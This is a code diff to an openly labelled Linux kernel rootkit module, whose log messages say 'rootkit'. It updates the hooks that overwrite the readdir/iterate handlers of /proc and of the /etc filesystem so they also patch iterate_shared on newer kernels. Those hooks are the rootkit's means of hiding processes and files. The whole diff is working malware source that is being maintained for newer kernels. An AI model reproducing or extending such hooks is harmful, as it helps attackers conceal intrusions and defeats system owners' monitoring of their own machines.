@@ -200,7 +200,10 @@ static void procfs_clean(void)
 	}
 	if (proc_fops != NULL && proc_readdir_orig != NULL) {
 		set_addr_rw(proc_fops);
-		proc_fops->iterate = proc_readdir_orig;
+		if(proc_fops->iterate_shared)
+			proc_fops->iterate_shared = proc_readdir_orig;
+		else
+			proc_fops->iterate = proc_readdir_orig;
 		set_addr_ro(proc_fops);
 	}
 }
@@ -209,7 +212,10 @@ static void fs_clean(void)
 {
 	if (fs_fops != NULL && fs_readdir_orig != NULL) {
 		set_addr_rw(fs_fops);
-		fs_fops->iterate = fs_readdir_orig;
+		if(fs_fops->iterate_shared)
+			fs_fops->iterate_shared = fs_readdir_orig;
+		else	
+			fs_fops->iterate = fs_readdir_orig;
 		set_addr_ro(fs_fops);
 	}
 }
@@ -234,10 +240,19 @@ static int __init procfs_init(void)
 	proc_fops = ((struct file_operations *) proc_filp->f_op);
 	filp_close(proc_filp, NULL);
 
-	proc_readdir_orig = proc_fops->iterate;
-	set_addr_rw(proc_fops);
-	proc_fops->iterate = proc_readdir_new;
-	set_addr_ro(proc_fops);
+	if(proc_fops->iterate_shared){
+		proc_readdir_orig = proc_fops->iterate_shared;
+		set_addr_rw(proc_fops);
+		proc_fops->iterate_shared = proc_readdir_new;
+		set_addr_ro(proc_fops);
+	}
+	else{
+		proc_readdir_orig = proc_fops->iterate;
+		set_addr_rw(proc_fops);
+		proc_fops->iterate = proc_readdir_new;
+		set_addr_ro(proc_fops);
+	}
+
 	printk("rootkit_proc_init_success");
 	return 1;
 }
@@ -254,10 +269,19 @@ static int __init fs_init(void)
 	filp_close(etc_filp, NULL);
 	
 	//substitute readdir of fs on which /etc is
-	fs_readdir_orig = fs_fops->iterate;
-	set_addr_rw(fs_fops);
-	fs_fops->iterate = fs_readdir_new;
-	set_addr_ro(fs_fops);
+	if(fs_fops->iterate_shared){
+		fs_readdir_orig = fs_fops->iterate_shared;
+		set_addr_rw(fs_fops);
+		fs_fops->iterate_shared = fs_readdir_new;
+		set_addr_ro(fs_fops);
+	}
+	else{
+		fs_readdir_orig = fs_fops->iterate;
+		set_addr_rw(fs_fops);
+		fs_fops->iterate = fs_readdir_new;
+		set_addr_ro(fs_fops);
+	}
+	
 	printk("rootkit_fs_init_success");
 	return 1;
 }
